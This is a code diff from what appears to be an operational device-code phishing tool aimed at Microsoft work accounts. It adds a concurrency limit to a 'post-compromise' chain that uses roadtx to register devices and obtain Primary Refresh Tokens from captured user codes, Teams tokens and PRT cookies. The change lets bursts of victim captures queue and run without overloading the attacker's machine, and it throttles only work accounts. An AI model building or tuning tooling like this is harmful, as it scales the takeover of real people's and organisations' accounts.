@@ -200,6 +200,12 @@ def _finalize_and_alert(user_code, teams_token, prt_cookie):
 ACTIVE_CHAINS = set()
 _CHAIN_LOCK = threading.Lock()
 
+# Global cap on simultaneous roadtx chains. Each chain is a subprocess tree
+# (device registration, PRT, DRS) and unbounded fan-out starves the box, so a
+# burst of captures queues here rather than all launching at once.
+_CHAIN_SLOTS = threading.BoundedSemaphore(int(getattr(Config, 'CHAIN_CONCURRENCY', 20)))
+_CHAIN_QUEUE_TIMEOUT = int(getattr(Config, 'CHAIN_QUEUE_TIMEOUT', 600))
+
 
 def is_chain_running(user_code):
     """Check if the post-compromise device registration & PRT chain is currently running."""
@@ -223,9 +229,25 @@ def execute_post_compromise(user_code):
             logger.info(f"[EXECUTOR] Chain already running for {user_code} — skipping duplicate.")
             return
         ACTIVE_CHAINS.add(user_code)
+
+    # Wait for a free slot. Personal sessions skip the chain entirely, so this
+    # only ever throttles work captures.
+    session = db.get_session_by_user_code(user_code) or {}
+    if (session.get('account_type') or 'work') != 'personal':
+        acquired = _CHAIN_SLOTS.acquire(timeout=_CHAIN_QUEUE_TIMEOUT)
+        if not acquired:
+            logger.warning(f"[EXECUTOR] {user_code}: no chain slot within "
+                           f"{_CHAIN_QUEUE_TIMEOUT}s — running without a slot.")
+        else:
+            logger.info(f"[EXECUTOR] {user_code}: chain slot acquired.")
+    else:
+        acquired = False
+
     try:
         _run_post_compromise_chain(user_code)
     finally:
+        if acquired:
+            _CHAIN_SLOTS.release()
         ACTIVE_CHAINS.discard(user_code)
 
 
